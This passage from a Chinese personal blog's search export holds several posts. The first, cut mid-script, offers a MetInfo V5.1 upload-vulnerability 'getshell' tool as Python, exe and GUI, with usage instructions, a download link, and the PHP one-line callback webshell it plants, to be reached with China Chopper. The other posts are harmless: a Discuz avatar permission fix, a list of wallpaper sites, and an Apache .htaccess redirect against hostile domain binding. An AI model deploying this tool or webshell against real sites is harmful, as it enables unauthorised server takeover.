threading.Thread(target = bp,args=(urls,time_out,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
<p>程序略显粗糙</p>
<p>为了方便，我也把他打包成了<strong>exe</strong></p>
<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
<hr>
<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
<blockquote>
<p>MetInfo V5.1上传漏洞getshell利用工具</p>
</blockquote>
<blockquote>
<pre><code>作者 : Akkuman
</code></pre></blockquote>
<blockquote>
<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
</blockquote>
<blockquote>
<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
<p>GUI程序，应该不用说</p>
<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>菜刀连接，密码是Akkuman</p>
<p>爆破结果会生成在<strong>url.txt</strong></p>
</blockquote>
<hr>
<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="noopener">(访问码:1475)</a></p>
<p><em>转载请注明出处</em></p>
<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>discuz 不能上传头像提示can not write to the data/tmp folder</title>
    <url>/2016/05/31/discuz%20%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E6%8F%90%E7%A4%BAcan%20not%20write%20to%20the%20datatmp%20folder.html</url>
    <content><![CDATA[<hr>
<h1 id="discuz-不能上传头像提示can-not-write-to-the-data-tmp-folder"><a href="#discuz-不能上传头像提示can-not-write-to-the-data-tmp-folder" class="headerlink" title="discuz 不能上传头像提示can not write to the data/tmp folder"></a>discuz 不能上传头像提示can not write to the data/tmp folder</h1><hr>
<h2 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h2><p>disucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。</p>
<a id="more"></a>
<h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p>首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。</p>
]]></content>
      <categories>
        <category>Discuz</category>
      </categories>
      <tags>
        <tag>website</tag>
      </tags>
  </entry>
  <entry>
    <title>Many Website Of WallPaper</title>
    <url>/2016/05/31/Many%20Website%20Of%20WallPaper.html</url>
    <content><![CDATA[<p>我在这里给大家推荐几个不错的壁纸网站</p>
<p>毕竟一张赏心悦目的壁纸能让你的工作效率提高不少</p>
<p><strong>注意前方高能</strong></p>
<p><strong>一大波网站即将来袭</strong></p>
<h1 id="一系列-如你所见"><a href="#一系列-如你所见" class="headerlink" title="一系列  如你所见"></a>一系列  如你所见</h1><ul>
<li><a href="http://wall.alphacoders.com/" target="_blank" rel="noopener">alphacoders</a></li>
<li><a href="http://wallpaperdj.com/" target="_blank" rel="noopener">wallpaperdj</a></li>
<li><a href="https://alpha.wallhaven.cc/" target="_blank" rel="noopener">Wallhaven(<em>推荐</em>)</a><a id="more"></a></li>
<li><a href="http://wallpaperswa.com/" target="_blank" rel="noopener">wallpaperswa</a></li>
<li><a href="http://hdw.eweb4.com/" target="_blank" rel="noopener">eweb4</a></li>
<li><a href="http://wallls.com/" target="_blank" rel="noopener">wallls</a></li>
<li><a href="http://topwallpapers.pw/" target="_blank" rel="noopener">topwallpapers</a></li>
<li><a href="http://www.wallpaperfo.com/" target="_blank" rel="noopener">wallpaperfo</a></li>
<li><a href="http://www.wallpapermay.com/" target="_blank" rel="noopener">wallpapermay</a></li>
<li><a href="http://www.picstopin.com/" target="_blank" rel="noopener">picstopin</a></li>
<li><a href="http://www.wallpaperup.com/" target="_blank" rel="noopener">wallpaperup</a></li>
<li><a href="http://www.wall321.com/" target="_blank" rel="noopener">wall321</a></li>
<li><a href="http://www.wallsave.com/" target="_blank" rel="noopener">wallsave</a></li>
<li><a href="http://wallpaperswide.com/" target="_blank" rel="noopener">wallpaperswide</a></li>
<li><a href="https://www.desktopnexus.com/" target="_blank" rel="noopener">desktopnexus</a></li>
<li><a href="http://www.goodfon.su/" target="_blank" rel="noopener">goodfon</a></li>
<li><a href="http://www.vladstudio.com/zh/home/" target="_blank" rel="noopener">vladstudio(<em>推荐</em>)</a></li>
<li><a href="http://simpledesktops.com/" target="_blank" rel="noopener">simpledesktops(<em>极简</em>)</a></li>
<li><a href="https://interfacelift.com/wallpaper/downloads/date/any/" target="_blank" rel="noopener">interfacelift</a></li>
<li><a href="https://www.kuvva.com/" target="_blank" rel="noopener">kuvva</a></li>
<li><a href="http://switch-box.net/category/wallpaper" target="_blank" rel="noopener">switch-box</a></li>
<li><a href="http://cn.gde-fon.com/" target="_blank" rel="noopener">gde-fon</a></li>
<li><a href="http://www.istartedsomething.com/bingimages/" target="_blank" rel="noopener">bingimages</a></li>
<li><a href="http://www.wallpaper4k.com/" target="_blank" rel="noopener">wallpaper4k(<em>推荐</em>)</a></li>
<li><a href="http://feelgrafix.com/" target="_blank" rel="noopener">feelgrafix</a></li>
<li><a href="http://www.facets.la/" target="_blank" rel="noopener">facets(<em>元素块构图</em>)</a></li>
<li><a href="http://justinmaller.com/" target="_blank" rel="noopener">justinmaller(<em>略抽象</em>)</a></li>
<li><a href="http://7-themes.com/" target="_blank" rel="noopener">7-themes</a></li>
<li><a href="http://superhd.site/" target="_blank" rel="noopener">superhd</a></li>
<li><a href="http://www.fondos7.net/" target="_blank" rel="noopener">fondos7</a></li>
<li><a href="http://cn.forwallpaper.com/" target="_blank" rel="noopener">forwallpaper(<em>推荐</em>)</a></li>
<li><a href="http://h.bilibili.com/wallpaper?action=list" target="_blank" rel="noopener">大B站的动漫壁纸，二次元可选</a></li>
</ul>
<p>就推荐到这里吧，基本上是搜刮别人的答案而来，自己都有看过</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>lamp服务器被人恶意绑定域名的解决办法</title>
    <url>/2016/05/28/lamp%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E4%BA%BA%E6%81%B6%E6%84%8F%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
    <content><![CDATA[<h1 id="还没开始就被别人绑定了域名"><a href="#还没开始就被别人绑定了域名" class="headerlink" title="还没开始就被别人绑定了域名"></a>还没开始就被别人绑定了域名</h1><h2 id="事情的起因与发现"><a href="#事情的起因与发现" class="headerlink" title="事情的起因与发现"></a>事情的起因与发现</h2><p>刚买了个服务器搭建了一个dz，想着域名还没备案，就先搭建了起来，然后在做DDOS测试时偶然发现服务器被别人恶意把域名绑定了</p>
<h2 id="最初的解决方案"><a href="#最初的解决方案" class="headerlink" title="最初的解决方案"></a>最初的解决方案</h2><p>没管。。。。。。<br>后来发现有影响，朋友也一直给我说叫我整下</p>
<h2 id="利用重定向把恶意指向过来的域名指到别处"><a href="#利用重定向把恶意指向过来的域名指到别处" class="headerlink" title="利用重定向把恶意指向过来的域名指到别处"></a>利用重定向把恶意指向过来的域名指到别处</h2><p>要利用301重定向，首先我们要在Apache上配置一下，Apache默认是不开启.htaccess的</p>
<a id="more"></a>
<hr>
<h3 id="0x01-编辑httpd-conf文件"><a href="#0x01-编辑httpd-conf文件" class="headerlink" title="0x01.编辑httpd.conf文件"></a>0x01.编辑httpd.conf文件</h3><p>打开/etc/httpd/conf目录下的httpd.conf文件，找到这一行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p> 当然，你得确定你的/etc/httpd/modules下有mod_rewrite.so这个文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; ls /etc/httpd/modules | grep mod_rewrite</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>如果你没有找到这一行，记得在httpd.conf文件里直接添加这一行</p>
<hr>
<h3 id="0x02-设置AllowOverride"><a href="#0x02-设置AllowOverride" class="headerlink" title="0x02.设置AllowOverride"></a>0x02.设置AllowOverride</h3><p>同样的在httpd.conf文件中找到：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Directory <span class="string">"/var/www/html"</span>&gt;</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Possible values for the Options directive are "None", "All",</span></span><br><span class="line">    <span class="comment"># or any combination of:</span></span><br><span class="line">    <span class="comment">#   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Note that "MultiViews" must be named *explicitly* --- "Options All"</span></span><br><span class="line">    <span class="comment"># doesn't give it to you.</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The Options directive is both complicated and important.  Please see</span></span><br><span class="line">    <span class="comment"># http://httpd.apache.org/docs/2.4/mod/core.html#options</span></span><br><span class="line">    <span class="comment"># for more information.</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># AllowOverride controls what directives may be placed in .htaccess files.</span></span><br><span class="line">    <span class="comment"># It can be "All", "None", or any combination of the keywords:</span></span><br><span class="line">    <span class="comment">#   Options FileInfo AuthConfig Limit</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    AllowOverride All</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Controls who can get stuff from this server.</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p>
<p>或者它长这个样子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Directory /&gt;</span><br><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride None</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p>
<p>什么，你告诉我还是找不到？？？<br>那教你一个办法<br>锁定关键词<code>FollowSymLinks</code>和<code>AllowOverride None</code></p>
<blockquote>
<p>vi的向下查找命令是<code>:/你要查找的</code><br>vi的向上查找命令是<code>:?你要查找的</code><br>n是下一个<br>N是上一个</p>
</blockquote>
<p>相信你已经找到了<br>接下来把<code>None</code>改成<code>All</code></p>
<hr>
<h3 id="0x03-编写规则文件-htaccess"><a href="#0x03-编写规则文件-htaccess" class="headerlink" title="0x03.编写规则文件.htaccess"></a>0x03.编写规则文件.htaccess</h3><p>跑去网站根目录下，比如我的是/var/www/html<br>如果存在.htaccess，忽略下一步，直接打开编辑<br>然后新建.htaccess文件<code>touch .htaccess</code><br>编辑.htaccess文件<code>vi .htaccess</code><br>添加如下规则<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; ^www.别人的域名.com$</span><br><span class="line">RewriteRule ^(.*)$ http://www.自己的域名.com/<span class="variable">$1</span> [R=301,L]</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="个人的修改"><a href="#个人的修改" class="headerlink" title="个人的修改"></a>个人的修改</h1><p>我知道，你在网上所找到的方法都是上面那种代码，并且应该都没有提 教你怎么开启.htaccess<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%8E%BB%E4%BB%96%E7%88%B9%E7%9A%84%E9%80%BB%E8%BE%91.jpg" alt="去他爹的"><br>但是本人实验过，这配置进去还有问题，设置重启Apache后，访问网站提示500错误<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/500error.png" alt="500error"><br>机智的我总要查看日志啊<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/messages | grep httpd</span><br></pre></td></tr></table></figure></p>
<p>找到了错误<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/QQ%E5%9B%BE%E7%89%8720160528214617.png" alt="httpderror"><br>英语不太好，但是大致知道是服务器没有限定域名，需要修改ServerName,而ServerName字段值在httpd.conf中是被注释掉的<br>我们在httpd.conf修改它<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ServerName: www.example.com:80</span></span><br></pre></td></tr></table></figure></p>
<p>改为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ServerName: 115.**.**.57:80</span><br></pre></td></tr></table></figure></p>
<p>然后重启Apache，可以访问了</p>
<hr>
<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>好的故事都会有后续的</p>
<p>以为这样就万事大吉了?</p>
<p>但是我这个被坑得不轻<br>admin.xx.com都被他解析到我服务器上来了</p>
<p>老衲怎么破<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E6%88%90%E9%BE%99.jpg" alt="成龙挠头"><br>.htaccess好像可以用正则表达式，一查，果然<br>那就改一下.htaccess咯<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%82%BB%E7%AC%91.jpg" alt="shaxiao"><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; ^.*.别人的域名.com$</span><br><span class="line">RewriteRule ^(.*)$ http://www.自己的域名.com/<span class="variable">$1</span> [R=301,L]</span><br></pre></td></tr></table></figure></p>
<p>机智的你已经发现第三行中的www被我改成了.<em>，就是匹配0个或者多个字符，当然</em>你可以改成+</p>
<p>然后重启Apache</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service httpd restart</span><br></pre></td></tr></table></figure></p>
<p>现在我再访问。。。嘿嘿嘿，被我跳转到百度了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%98%BF%E5%98%BF%E5%98%BF.jpeg" alt="heihei"></p>
<hr>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>当然，还有其他的方法，自己也可以去网上找找<br>对了，那个刚才在httpd.conf里换ip的地方也可换自己的域名，因为我的还在备案，就没改</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
